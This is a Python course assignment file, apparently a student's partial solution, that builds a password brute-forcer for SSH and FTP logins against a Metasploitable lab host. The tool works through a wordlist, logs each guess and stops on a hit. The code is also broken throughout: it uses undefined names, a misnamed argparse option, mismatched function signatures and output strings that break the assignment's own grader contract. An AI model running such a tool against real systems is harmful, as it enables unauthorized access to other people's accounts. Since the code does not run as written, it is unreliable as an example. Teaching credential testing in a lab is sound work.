"""
================================================================================
COM5413 — The Benji Protocol
Task 3: The Access Validator
File:   brute.py
================================================================================

MISSION BRIEF
-------------
Some doors are locked. Some are locked with the factory default. A good
operative checks quietly, one at a time, without tripping the alarm. Benji
does not kick doors down — he tries the handle first, then tries the spare key,
then the one labelled "admin123" that someone left on a sticky note.

Your job is to build a targeted credential testing tool for SSH and FTP
services. This is a precision instrument, not a battering ram — the mandatory
delay between attempts is not optional, and it is not a courtesy. It is what
separates a professional test from a denial-of-service attack.

WHAT THIS SCRIPT MUST DO
-------------------------
1. Accept target IP, service (ssh/ftp), username, and wordlist path as
   command-line arguments.
2. For FTP: use ftplib to attempt authentication.
3. For SSH: use paramiko to attempt authentication.
4. Iterate through the wordlist, attempting each password in sequence.
5. Include time.sleep(0.1) between each attempt — this is a hard requirement.
6. Stop immediately upon finding valid credentials.
7. Log each attempt (timestamp, username, password tried, result) to a file.

CONSTRAINTS
-----------
- Python 3.10+ only.
- SSH: must use paramiko. FTP: must use ftplib.
- time.sleep(0.1) MUST be present between attempts — auto-grader checks this.
- NO use of input() — all input via argparse.
- Wordlist may contain empty lines and non-ASCII characters — handle both.

OUTPUT CONTRACT (auto-grader depends on this)
---------------------------------------------
On success, print exactly:
    [+] SUCCESS: Password found: <password>

On exhaustion (no valid credentials found), print exactly:
    [-] EXHAUSTED: No valid credentials found for user <username>

EXAMPLE USAGE
-------------
    python brute.py 192.168.56.101 --service ftp --user msfadmin --wordlist rockyou_small.txt
    python brute.py 192.168.56.101 --service ssh --user root --wordlist common_passwords.txt

BUILD LOG
---------
Use docs/build.md to document your testing approach. Record what you observe
when testing against Metasploitable — attempt counts, timing, any connection
drops. This becomes part of your evidence trail.
================================================================================
"""

# Your imports go here
import argparse
import ftplib
import sys
import time
from pathlib import Path

try:
    import paramiko
except ImportError:
    print("[-] paramiko not installed. Run: pip install paramiko", file=sys.stderr)
    sys.exit(1)


def parse_arguments():
    """
    Define and parse command-line arguments.

    Returns the parsed namespace object.
    Required: target (positional), --service, --user, --wordlist
    """
    # TODO: Implement argparse
    # --service must be constrained to choices: ['ssh', 'ftp']
    parser = argparse.ArgumentParser(description="Test credentials against FTP or SSH")
    parser.add_argument("target", help="Ip address or hostname")
    parser.add_argument(
        "--port", type=int, default=None, help="default 21 for ftp, 22 for ssh"
    )
    parser.add_argument(
        "--services",
        choices=["ftp", "ssh"],
        required=True,
        help="service to test ftp or ssh",
    )
    parser.add_argument("--user", required=True, help="username to test")
    parser.add_argument(
        "--wordlist", type=Path, required=True, help="Path to the wordlist to use"
    )
    return parser.parse_args()


def load_wordlist(wordlist_path: Path) -> list[str]:
    """
    Load passwords from a wordlist file.

    Args:
        wordlist_path: Path to the wordlist file.

    Returns:
        List of password strings with empty lines and whitespace stripped.

    Raises:
        FileNotFoundError: If wordlist does not exist.
    """
    # TODO: Implement wordlist loading
    # Handle: empty lines, non-ASCII bytes (use errors='ignore' on open)
    # If the file does not exists, exit with error code 1
    if not path.exists():
        print(f"[!] ERROR: Wordlist not found: {path}", file=sys.stderr)
        sys.exit(1)
    # ignore errors and whitespaces, to prevent the script from crashing due to a wordlist formation.
    with path.open("r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords from {path}")
    return passwords


def attempt_ftp(target: str, user: str, password: str) -> bool:
    """
    Attempt FTP authentication using ftplib.

    Args:
        target:   IP address string.
        user:     Username string.
        password: Password string to test.

    Returns:
        True if authentication succeeds, False otherwise.
    """
    # TODO: Implement FTP auth attempt
    # Handle: connection refused, timeout, authentication error
    # Do NOT let exceptions propagate — return False on any failure
    try:
        ftp = ftplib.FTP()
        # Attempt ftp connection, with a timeout of 5 so connection request doesn't hang
        ftp.connect(host, port, timeout=5)
        # Attempt login with known user and clean password wordlist
        ftp.login(user, password)
        # Close ftp connection
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except (ConnectionRefusedError, TimeoutError, OSError) as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        return False


def attempt_ssh(target: str, user: str, password: str) -> bool:
    """
    Attempt SSH authentication using paramiko.

    Args:
        target:   IP address string.
        user:     Username string.
        password: Password string to test.

    Returns:
        True if authentication succeeds, False otherwise.
    """
    # TODO: Implement SSH auth attempt
    # Use paramiko.SSHClient with AutoAddPolicy for host key
    # Handle: AuthenticationException, SSHException, socket errors
    # Do NOT let exceptions propagate — return False on any failure
    # Try logging in with the clean wordlist and a timeout of 5 to avoid network hanging.
    try:
        client.connect(
            host,
            port=port,
            username=user,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=5,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, OSError) as e:
        print(f"[!] SSH connection error: {e}", file=sys.stderr)
        return False
    finally:
        client.close()


def run_credential_test(host, port, user, passwords, attempt_fn, output_path=None):
    total = len(passwords)
    source = _local_ip(host, port)

    csv_file = None
    writer = None
    if output_path is not None:
        write_header = not output_path.exists() or output_path.stat().st_size == 0
        csv_file = output_path.open("a", newline="", encoding="utf-8")
        writer = csv.DictWriter(
            csv_file,
            fieldnames=["timestamp", "user", "password", "result", "source"],
        )
        if write_header:
            writer.writeheader()

    try:
        for i, password in enumerate(passwords, start=1):
            print(f"[*] Attempt {i}/{total}: {user}:{password}")

            success = attempt_fn(host, port, user, password)
            result = "SUCCESS" if success else "FAIL"

            if writer:
                writer.writerow(
                    {
                        "timestamp": datetime.now(timezone.utc).strftime(
                            "%Y-%m-%dT%H:%M:%S"
                        ),
                        "user": user,
                        "password": password,
                        "result": result,
                        "source": source,
                    }
                )
                csv_file.flush()

            if success:
                return password

            time.sleep(0.1)
    finally:
        if csv_file:
            csv_file.close()

    return None


def main():
    args = parse_arguments()
    # TODO: Wire parse_arguments → load_wordlist → attempt loop
    # Remember: time.sleep(0.1) between EVERY attempt
    # Log each attempt to a file for the evidence trail:
    """Main orchestration: parse args, load wordlist, run test, report."""
    args = parse_arguments()

    # Resolve default port based on service
    if args.port is None:
        args.port = 21 if args.service == "ftp" else 22

    # Load and validate wordlist
    passwords = load_wordlist(args.wordlist)

    if not passwords:
        print("[!] Wordlist is empty after cleaning.", file=sys.stderr)
        sys.exit(1)

    # Select the attempt function based on service
    if args.service == "ftp":
        attempt_fn = attempt_ftp
    elif args.service == "ssh":
        attempt_fn = attempt_ssh

    # Run the credential test
    print(f"[*] Target:   {args.target}:{args.port}")
    print(f"[*] Service:  {args.service}")
    print(f"[*] User:     {args.user}")
    print(f"[*] Wordlist: {len(passwords)} entries")
    print(f"[*] Output:   {args.output}")
    print()

    result = run_credential_test(
        args.target, args.port, args.user, passwords, attempt_fn, args.output
    )

    if result:
        print(f"\n[*] FOUND: {args.user}:{result}")
    else:
        print(
            f"\n[-] EXHAUSTED: Wordlist complete — no valid credentials for {args.user}"
        )


if __name__ == "__main__":
    main()
